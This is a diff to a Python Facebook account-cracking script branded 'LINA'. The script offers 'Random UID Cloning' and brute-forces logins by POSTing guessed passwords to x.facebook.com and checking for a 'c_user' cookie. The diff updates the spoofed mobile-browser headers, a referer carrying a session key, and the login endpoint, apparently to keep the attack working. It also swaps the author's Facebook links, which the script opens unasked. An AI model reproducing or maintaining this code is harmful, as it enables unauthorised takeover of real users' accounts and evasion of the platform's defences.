@@ -44,13 +44,12 @@ logo = """
 | |   |_ _| | \| |(_)_\(_) 
 | |__  | |  | .` | / _ \   
 |____||___| |_|\_|/_/ \_\      \033[1;32m                   
-
-  
-  OWNER   :      LINA 
+  __________________________________
+  OWNER   :      LINA Khan 
  
-  GITHUB   :      LINA
+  GITHUB   :      LINA-QUEEN42 
 
-  Facebook :      LINA 
+  Facebook :      LINA Kumari 
 __________________________________\033[1;37m"""
 loop = 0
 ok = []
@@ -74,7 +73,7 @@ def LINA_select():
 	elif LINA == '1':
 		LINA_TRICKER()
 	elif LINA == '2':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100007946797233')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100090047148832')
 		main()
 	elif LINA == '3':
 		os.system('xdg-open https://chat.whatsapp.com/Cntlb8VXTIi6Hntmk7sODi')
@@ -90,7 +89,7 @@ def LINA_select():
 def LINA_TRICKER():
 	os.system('clear')
 	print(logo)
-	os.system('xdg-open https://www.facebook.com/profile.php?id=100007946797233')
+	os.system('xdg-open https://www.facebook.com/profile.php?id=100090047148832')
 	print('\x1b[1;92m[1]\x1b[1;93m Random UID Cloning')
 	print('\x1b[1;92m[0]\x1b[1;94m Back')
 	print(47*'\033[92;1m-')
@@ -107,7 +106,7 @@ def LINA_TRICKER():
 def method():
 	os.system('clear')
 	print(logo)
-	os.system('xdg-open https://www.facebook.com/profile.php?id=100007946797233')
+	os.system('xdg-open https://www.facebook.com/profile.php?id=100090047148832')
 	print('\x1b[1;92m[1]\x1b[1;93m Method1  \x1b[1;92m[Ok idz] \x1b[1;93m[BEST]')
 	print('\x1b[1;92m[2]\x1b[1;94m Method2  \x1b[1;92m[Ok idz]')
 	print('\x1b[1;92m[0]\x1b[1;95m Back')
@@ -185,26 +184,24 @@ def mcrack(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {'authority': 'x.facebook.com',
-			'method':'GET',
-		    'path': '/',
-    'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
+    'referer': 'https://x.facebook.com/?rtime=1691057955&subno_key=AaGQ7Ou1gr-QeTBFiJkbmHbUXAlPaJqs8-Z9HEM1CymVpQtWFj21O99fevekpuU_1NWNaED9Sest7KLIqsUUFyyh45NpLPKE-4Ibl3gjnVnnuN_ly9HDtwr93lqMOi4iROH9AE-BIwiS0BoV7qRVcBF3wii1qmpvP1-bgiNm45csXQqKoLqHfhQ2kjau_R05l-9D93tABIBq5E4oeohebLivaIrxRh8K_thX-1U4GbeH_eJEbim_pFZbibAZVjYI753R-Ey4vvgndDjefnUseZ5idl2hCt678Zh3WXsiqh4DLk3klRG7yo6TEGiOulSJLtM&hrc=1&wtsid=rdr_0JVhizGWrCydmM346&refsrc=deprecated&_rdr',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"LDN-L21"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-platform-version': '"8.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-
-			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+			lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
@@ -291,25 +288,24 @@ def mbcrack(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {'authority': 'x.facebook.com',
-		    'method':'GET',
-		    'path': '/',
-    'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',   
+    'referer': 'https://x.facebook.com/?rtime=1691057955&subno_key=AaGQ7Ou1gr-QeTBFiJkbmHbUXAlPaJqs8-Z9HEM1CymVpQtWFj21O99fevekpuU_1NWNaED9Sest7KLIqsUUFyyh45NpLPKE-4Ibl3gjnVnnuN_ly9HDtwr93lqMOi4iROH9AE-BIwiS0BoV7qRVcBF3wii1qmpvP1-bgiNm45csXQqKoLqHfhQ2kjau_R05l-9D93tABIBq5E4oeohebLivaIrxRh8K_thX-1U4GbeH_eJEbim_pFZbibAZVjYI753R-Ey4vvgndDjefnUseZ5idl2hCt678Zh3WXsiqh4DLk3klRG7yo6TEGiOulSJLtM&hrc=1&wtsid=rdr_0JVhizGWrCydmM346&refsrc=deprecated&_rdr',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"LDN-L21"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-platform-version': '"8.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+			lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
